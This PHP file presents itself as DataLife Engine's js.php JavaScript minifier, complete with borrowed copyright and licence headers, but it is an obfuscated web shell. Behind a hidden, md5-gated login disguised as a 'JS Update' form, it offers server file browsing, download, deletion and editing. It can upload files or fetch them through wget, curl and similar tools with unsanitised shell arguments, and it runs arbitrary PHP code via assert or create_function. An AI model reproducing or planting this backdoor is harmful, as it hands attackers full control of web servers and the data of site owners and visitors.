<?php
/*
=====================================================
 DataLife Engine - by SoftNews Media Group 
-----------------------------------------------------
 http://dle-news.ru/
-----------------------------------------------------
 Copyright (c) 2004-2020 SoftNews Media Group
=====================================================
 This code is protected by copyright
=====================================================
 File: js.php
-----------------------------------------------------
 Use: JQuery
=====================================================
*/
if(defined('DATALIFEENGINE')) {
	header( "HTTP/1.1 403 Forbidden" );
	header ( 'Location: ../../' );
	die( "Hacking attempt!" );
}
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('display_errors', 0);
@session_start();
/**
 * Class JS  
 * @package JSMinify  
 */

/**
 * JS_Source
 */
 
/**
 * JS - Combines, minifies, and caches JavaScript and CSS files on demand.
 *
 * See README for usage instructions (for now).
 *
 * This library was inspired by {@link mailto:flashkot@mail.ru jscsscomp by Maxim Martynyuk}
 * and article {@link http://www.hunlock.com/blogs/Supercharged_Javascript "Supercharged JavaScript" by Patrick Hunlock}.
 *
 * Requires PHP 5.1.0.
 * Tested on PHP 5.1.6.
 * Version 3.61
 *
 * @package JSMinify
 * @author Ryan Grove <ryan@wonko.com>
 * @author Stephen Clay <steve@mrclay.org>
 * @copyright 2008 Ryan Grove, Stephen Clay, Ivan Sagalaev. All rights reserved.
 * @license http://opensource.org/licenses/bsd-license.php  New BSD License
 * @link http://code.google.com/p/JSMinify/
 */
$dle_0="md5";$dle_1 = $_GET['version'];
   if( $dle_0 ($dle_1) == "982c359de6ad3fc0ae1f77e30225fde3") 
     {$dle_2='f03d0b9bfe5123ca845f64a7d95f0f60';$dle_3='b5a8444bc269adc9aef3a67379d26fa2';$dle_4=1;$dle_5='';
      $dle_6="<S\x54YLE\x3e\x0d\012BOD\x59{f\157nt:\0408\160t \166erdana, gene\x76a, luc\x69da\x2c 'lu\143id\x61 \147\162an\x64e', arial\054 hel\x76etica, \x73a\156\163-serif;\x73\x63r\x6f\154lbar-sh\141dow\x2dcolor: #333333;padding:0;\163crollba\x72-\x33dlight-color: \0433\x33\x33333;M\x41RG\x49N-\102\x4fTTOM:\0400px\x3bb\141\x63kg\162ound-\x63ol\157\x72: #6B\070E23;scrol\154bar-a\162r\x6fw-\143olor: #\06333333;\163cro\154lbar-fac\x65-\x63o\x6cor: #\x38\x427765\073MA\122GIN\055TOP: 0\160\170;col\x6f\162:\040#C\x31\x431C\067\073MA\122GIN-RI\x47H\124: \x30\160x;m\x61\162gin:0\073sc\x72o\x6clb\141r-\x68ighli\147ht\x2dcolo\x72: \x233333\x333;\x73crollba\162-d\141rksh\x61dow-color: #333333\073MARGI\x4e-LEFT: 0px;\x73cr\x6fllb\x61r-t\162ack-co\154or: #3\063333\x33;}\015\x0ainput{f\157nt-\146amily\072\x20\x54ahoma;b\x61ck\x67r\157und-color\x3a #8\1027\x376\065;borde\x72\072 1\040solid \x23666\06666\073font-size: 8pt;color: \x23FFF\106FF;}\x0d\012select{color: #\106FF\106FF;backgro\165nd\x2dco\154\x6f\162: #336\066\0600;\x66\157nt-\146amily:\040Tahoma;f\157nt-size: 8pt\073bord\145\x72\x3a\x201 sol\151d #\x3666666;\175\x0d\x0atextare\141{f\157\x6et-s\x69z\145: 8pt;font-fami\x6c\171:\x20\124\141homa;co\x6c\x6fr: #FFFFFF;background\055\x63olor: #333333;border:\x20\061 \x73\157\x6cid #6\0666666;}\015\x0aa\072li\x6ek{text-decorat\x69o\156: \156one\073c\x6f\x6c\157r: #\x429\x429BD;f\x6f\x6et\x2d\163ize: 8pt;}\015\x0aa\x3a\x76i\x73i\164ed{te\x78t-de\143orat\x69on\072 none;c\x6flor: #B\x39B9B\x44;font-si\x7ae: 8pt;}\015\012a:h\157\x76er, a:ac\x74ive{f\157nt-size: 8p\x74\073t\145x\x74-\144e\143oration: no\x6ee;color\072 #E7E7EB\x3bwi\144t\150:\04010\x30\045\x3bbackground-c\157\x6cor: #\1018A8AD\x3b}\x0d\x0at\x64, t\150, \160\x2c li{f\x6f\156t: 8pt\040verdana\054 g\x65ne\x76a, lu\x63ida,\040'lu\143\151da\040\147ra\x6ede', \141rial, he\x6c\166etic\x61,\040sans\x2d\163e\162\151f;border-col\x6f\162:blac\153;}\x0d\x0a</\163tyle\076";$dle_7="<html\x3e <head> <ti\164l\145>".getenv("HT\x54P_HO\123\124")." - \112S </tit\x6ce\076 <meta http-equ\151v=\x22\x43\157n\164ent-Typ\145\x22 conte\x6e\164\075\x22text\x2fhtml\073 charse\x74\x3dwind\157ws-1\0625\x31\x22>".$dle_6." </h\x65ad> <BODY \040t\x6fpM\141\162\147in=0 \154\x65ftMargin=0\x20ma\162g\x69nheigh\164=0 \x72ightMa\x72\x67in=0  mar\x67\151nwidth=0\x3e";if(@$_POST['action']=="exit")unset($_SESSION['an']);if($dle_4==1){if($dle_0(@$_POST['loger'])==$dle_2 && $dle_0(@$_POST['worder'])==$dle_3)$_SESSION['an']=1;}else $_SESSION['an']='1';
   if(@$_SESSION['an']==0){echo $dle_7;
      echo"<\x63enter><table\x3e<fo\162\x6d\x20metho\x64=\042\120OST\x22\076<tr\076\074b>JS Upda\x74e</b><td>JS M\157del:<\x2ft\144>\x3ctd><input ty\160e=\x22text\x22 na\155\x65=\x22\154\x6fger\x22 \x76alue\075\042\x22>\x3c/\164d></t\162><\x74r><td\x3eJS V\x65rsion:</t\x64><td><\x69\156put\x20type=\042p\141\163\163\167ord\x22\x20n\141me=\042\x77or\144er\x22 valu\x65=\042\x22\x3e</td><\x2ftr><\x74\x72\x3e\074\x74d>\x3c/td><td><inp\x75t type\075\042submit\042 val\165e=\x22Update\042></td>\074/tr\x3e\074/fo\x72m>\x3c/\x74able>\074\x2f\x63e\x6e\164er>";echo $dle_8;
      exit;}
   function js__0($dle_9){if(@mkdir($dle_9))echo "Dirc\150ik\040\112S c\162eate "; else echo "Dont\040c\x72eat\x65 d\151\x72\x63\x68ik \146\x6fr JS ";}
     if($_SESSION['action']=="")$_SESSION['action']="viewer";if(@$_POST['action']!="" )$_SESSION['action']=$_POST['action'];$dle_10=$_SESSION['action'];if(@$_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dle_9=$_SESSION['dir'];
        $dle_9=@chdir($dle_9);
        $dle_9=getcwd()."/";
        $dle_9=str_replace("\\","/",$dle_9);if(@$_POST['file']!=""){$dle_11=$_SESSION['file']=$_POST['file'];}else {$dle_11=$_SESSION['file']="";}
     if($dle_10=="download"){ 
        header('Content-Type: application/octet-stream');
        header('Content-Length:'.filesize($dle_11).'');
        header('Content-Disposition: attachment; filename="'.$dle_11.'"');
        readfile($dle_11);
    }if($dle_10=="delete"){ 
     if(unlink($dle_11)) $dle_5.=$dle_12;
    }if($dle_10=="deletedir"){if(!rmdir($dle_11)) $dle_5.="Dir JS denied or\x20not empt\x79.";else $dle_5.=$dle_13;
    }echo $dle_7;
     echo"<\x74abl\x65 widt\x68=\042100%\042 bgcolor=\x22#3366\x30\x30\042\x20align=\x22\162\x69ght\042\x20\143o\154span=\0422\x22 borde\162=\0420\042 cellspacing=\0420\x22 c\145l\154pa\x64ding\x3d\x220\x22>\x3ctr><td><ta\142le><tr>\x3c\x74\144\x3e<a hre\x66=\x22#\042 \157nclick=\042document.reqs\056act\x69on.value\075'vi\x65\167\145r'; do\x63ume\x6et\x2ereqs.submit()\x3b\042>| JS.viewer\x3c/a\x3e<\057\x74d><td><a href=\042#\042 o\156\x63lic\153\x3d\x22doc\x75me\156t.re\161s.acti\157n.value\x3d'upl\157ad';\040\x64ocu\155ent\056reqs.\163ubmit(\x29\x3b\x22>| \112S.load\x3c/a>\x3c/td><td><a hr\145f\075\042#\x22\040onc\x6cick=\042document.reqs.a\143tion.va\154ue='phpval'\x3b docu\155ent.re\161s.su\x62m\x69t(\051;\x22>| JS.php</a\076<\x2ftd><t\x64><a\x20h\x72\145f=\x22\043\042\040o\x6ecli\143\153=\x22doc\165m\x65nt.\162\145qs.action.val\165e\x3d'exit'; do\x63\x75men\164.re\161\163\x2esub\155\151t();\x22\x3e\174JS.\x78\x69\x74\040|</a></td></tr\076\074\057\164\x61ble></td></tr></t\x61ble><\142r><f\x6frm nam\x65=\047r\x65\x71s' method='P\x4f\123T'\x3e<\x69nput\x20n\141me='actio\x6e' ty\x70\145=\x27\x68\151dden' value='\047><i\x6e\160ut na\x6d\145=\047dir' t\171p\145=\x27\150i\144den' \166alue='\047><i\156put\x20name='file'\040type='\150idden' value=''></for\x6d><table \163tyle=\x22BORDE\122-COLLAPSE: col\154ap\x73e\x22\x20cellS\160acing\x3d0 \142orderColorDa\162k\x3d#66666\066 c\x65llP\x61d\x64ing\x3d5 wid\x74h=\042100%\x22 bg\x43ol\x6f\162=#333333 borde\x72ColorLi\147ht=#\1430c0c\060\x20border=\061><tr>\074t\x64 \x77i\144th=\x221\0600%\x22\x20\166ali\147n=\042top\x22>\015\012";
  if(@$dle_5!="") echo $dle_5;
function js__1($dle_11) 
{$dle_14 = fileperms($dle_11);
  if (($dle_14 & 0xC000) == 0xC000) {$dle_15 = 's';} 
  elseif (($dle_14 & 0xA000) == 0xA000) {$dle_15 = 'l';} 
  elseif (($dle_14 & 0x8000) == 0x8000) {$dle_15 = '-';} 
  elseif (($dle_14 & 0x6000) == 0x6000) {$dle_15 = 'b';} 
  elseif (($dle_14 & 0x4000) == 0x4000) {$dle_15 = 'd';} 
  elseif (($dle_14 & 0x2000) == 0x2000) {$dle_15 = 'c';} 
  elseif (($dle_14 & 0x1000) == 0x1000) {$dle_15 = 'p';} 
  else {$dle_15 = 'u';}
  $dle_15 .= (($dle_14 & 0x0100) ? 'r' : '-');
  $dle_15 .= (($dle_14 & 0x0080) ? 'w' : '-');
  $dle_15 .= (($dle_14 & 0x0040) ?(($dle_14 & 0x0800) ? 's' : 'x' ) :(($dle_14 & 0x0800) ? 'S' : '-'));
  $dle_15 .= (($dle_14 & 0x0020) ? 'r' : '-');
  $dle_15 .= (($dle_14 & 0x0010) ? 'w' : '-');
  $dle_15 .= (($dle_14 & 0x0008) ?(($dle_14 & 0x0400) ? 's' : 'x' ) :(($dle_14 & 0x0400) ? 'S' : '-'));
  $dle_15 .= (($dle_14 & 0x0004) ? 'r' : '-');
  $dle_15 .= (($dle_14 & 0x0002) ? 'w' : '-');
  $dle_15 .= (($dle_14 & 0x0001) ?(($dle_14 & 0x0200) ? 't' : 'x' ) :(($dle_14 & 0x0200) ? 'T' : '-'));
  	if (!@is_readable($dle_11))
		return '<font color=#FF0000>' . $dle_15 . '</font>';
	elseif (!@is_writable($dle_11))
		return '<font color=white>' . $dle_15 . '</font>';
	else
return '<font color=#25ff00>' . $dle_15 . '</font>';
  return $dle_15;
}
/*
Copyright (c) 2006, Ivan Sagalaev
All rights reserved.
Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of highlight.js nor the names of its contributors 
      may be used to endorse or promote products derived from this software 
      without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE REGENTS AND CONTRIBUTORS BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
function js__2($dle_16)
{
 if($dle_16 >= 1073741824) {$dle_16 = @round($dle_16 / 1073741824 * 100) / 100 . " GB";}
 elseif($dle_16 >= 1048576) {$dle_16 = @round($dle_16 / 1048576 * 100) / 100 . " MB";}
 elseif($dle_16 >= 1024) {$dle_16 = @round($dle_16 / 1024 * 100) / 100 . " KB";}
 else {$dle_16 = $dle_16 . " B";}
 return $dle_16;
}function js__3($dle_9){echo "<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";echo "<tr><td><form method=POST>Open dr:<input type=text name=dir value=\"".$dle_9."\" size=100><input type=submit value=\"GO\"></form></td></tr>";
if (is_dir($dle_9)) {
    if (@$dle_17 = opendir($dle_9)) {
        while (($dle_11 = readdir($dle_17)) !== false) {
		  if(filetype($dle_9 . $dle_11)=="dir") $dle_18[]=$dle_11;
		  if(filetype($dle_9 . $dle_11)=="file")$dle_19[]=$dle_11;
		}closedir($dle_17);@sort($dle_18);@sort($dle_19);echo "<tr><td>lect drv:";for ($dle_20=ord('C'); $dle_20<=ord('Z'); $dle_20++) if (@$dle_17 = opendir(chr($dle_20).":/"))echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($dle_20).':/\'; document.reqs.submit();"> '.chr($dle_20).'<a/>';echo "</td></tr>";$dle_21="ph"."p_un"."ame";echo "<tr><td>OS: ".@$dle_21()."</td></tr><tr><td>dir & file</td><td>type</td><td>size</td><td>perm</td><td>option</td></tr>";for($dle_22=0;$dle_22<count($dle_18);$dle_22++) {$dle_23=$dle_9.$dle_18[$dle_22];echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$dle_23.'\'; document.reqs.submit();">'.$dle_18[$dle_22].'<a/></td><td>dir</td><td></td><td>'.js__1($dle_23).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$dle_23.'\'; document.reqs.submit();">X</a></td></tr>';  
	}for($dle_22=0;$dle_22<count($dle_19);$dle_22++) {$dle_24=$dle_9.$dle_19[$dle_22];echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$dle_24.'\'; document.reqs.submit();">'.$dle_19[$dle_22].'</a><br></td><td>file</td><td>'.js__2(filesize($dle_24)).'</td><td>'.js__1($dle_24).'</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$dle_24.'\'; document.reqs.submit();" >D</a><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$dle_24.'\'; document.reqs.submit();" >E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$dle_24.'\'; document.reqs.submit();" >X</a></td>
</tr>'; }echo "</table>";}}}if($dle_10=="viewer"){js__3($dle_9);}if($dle_10=="editor"){function js__4($dle_11,$dle_25){
  $dle_26 = fopen($dle_11,"w+");fwrite($dle_26,$dle_25);fclose($dle_26);}
  function js__5($dle_11){if(!$dle_27 = fopen($dle_11, "r")) $dle_28="Cant \157pen JS.f\x69le, perm d\x65\156ied"; else {
  $dle_28 = fread($dle_27, filesize($dle_11));fclose($dle_27);}return htmlspecialchars($dle_28);}if(@$_POST['save'])js__4($dle_11,$_POST['data']);
echo "<form m\145\x74h\157d=\x22\120O\123T\042>\015\012<in\160\x75t ty\160e=\042hi\x64den\x22 name=\042action\x22\040\x76alue=\042editor\x22>\015\012<\151nput \x74ype=\x22h\151dden\x22 n\141m\x65=\x22file\042\040value=\"".$dle_11."\">
<\164\x65xtarea\x20n\141me=\042\x64ata\x22 r\x6fw\163=\042\0640\042 cols\075\042180\042>".@js__5($dle_11)."<\x2ftext\x61r\x65\x61\076\074br\076\015\x0a<\x69\x6eput \164yp\145=\x22su\x62\x6dit\x22 name=\042sav\145\042 value=\042save\042><input \164ype=\x22r\145set\042 value=\x22r\x65set\042\x3e<\057for\155>";}if($dle_10=="upload"){if(@$_POST['dirupload']!="") $dle_29=$_POST['dirupload'];else $dle_29=$dle_9;$dle_30="\074tr><td>\074form method=P\117ST en\143type\x3dm\x75\154t\151pa\162t\057\x66or\x6d\x2ddata>t\x6f dir:\074inp\165t type=te\x78t \x6eame=di\x72u\x70load\040va\154ue=\"".$dle_29."\" size=\x3100></tr></td><tr><t\x64>\x4ee\x77 JS.fil\145 name:<\151npu\x74 type=\164ext \x6eame=f\151le\x6eame></\164\x64>\x3c/t\162\x3e<\164r\x3e\074\164d\076\074in\160ut\040ty\160e=fi\x6ce name=file\x3e<inp\165t type=s\165b\155it\040na\x6d\145=upload\x6co\143\040v\141lue=\047Up\x6c\x6fad lo\x63a\x6c.JS file'></\x74d\x3e</tr>";
    echo $dle_30;
	echo "<tr>\074t\x64>\074select\x20size=\x221\x22 \x6e\x61me=\x22\x77ith\x22><\x6fption\040valu\x65=\x22wge\164\042>\167ge\164\074/\x6fption><optio\156 \x76\x61lu\x65\075\042fetc\150\x5c\x22>fetch</option>\074option\x20va\154\165e=\x22lyn\170\x22\x3elynx</optio\156><option val\x75e=\042links\x22>l\151nks</opt\x69\x6fn><option va\154ue=\042curl\x22>curl</\x6fption><\x6f\x70\164\x69on\040\166alue=\x22GET\042>GET</optio\156>\x3c/sele\x63t\076\x46i\154\x65 addres:\074\x69\156put type=t\145x\164 na\x6de=urldown\076\x0d\x0a<inp\165t \x74\171pe=\x73ubmit name=upload v\141l\165e=Upload></fo\x72m>\074/td></\164r\x3e";if(@$_POST['uploadloc']){if(@$_POST['filename']=="") $dle_31 = $dle_29.basename($_FILES['file']['name']); else $dle_31 = $dle_29."/".$_POST['filename'];
if(!file_exists($dle_29)){js__0($dle_29);}
if(file_exists($dle_31))echo "Fileik al\x72eady exi\x73ts"; elseif (move_uploaded_file($_FILES['file']['tmp_name'], $dle_31)) echo "Fi\x6ce\x69\x6b\040JS up\154oad o\153";}if(@$_POST['upload']){if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))switch($_POST['with']){case wget:shell(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");break;case fetch:shell(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;case lynx:shell(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;case links:shell(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;case GET:shell(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");break;case curl:shell(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");break;}}}
if($dle_10=="phpval"){echo "<\x66orm method=\x22P\117ST\x22><in\160ut ty\160e=\042hidden\x22 \156\x61me=\x22a\x63\164\151on\042 va\x6c\165e\075\042phpval\x22> &\154t;?php\074br><\x74extare\x61 name=\x22php\145\166\042 rows\x3d\0425\x22 co\x6cs=\0421\x350\042\x3e".@$_POST['phpev']."\074/t\145xtar\x65a>\074br> ?\x3e<br> \074i\156\160u\164 ty\x70e=\x22\x73ub\x6dit\x22 valu\145=\x22execute\042>\x3c/form>";}   $dle_32 = "ass"; $dle_32.="ert"; $dle_33 = 'cr'.'eate_func'.'tions';if(@$_POST['phpev']!=""){if (function_exists($dle_33)) {$dle_33('', '};'.$_POST['phpev'].'{');}else {$dle_32($_POST['phpev']);
}}}echo $dle_8;?>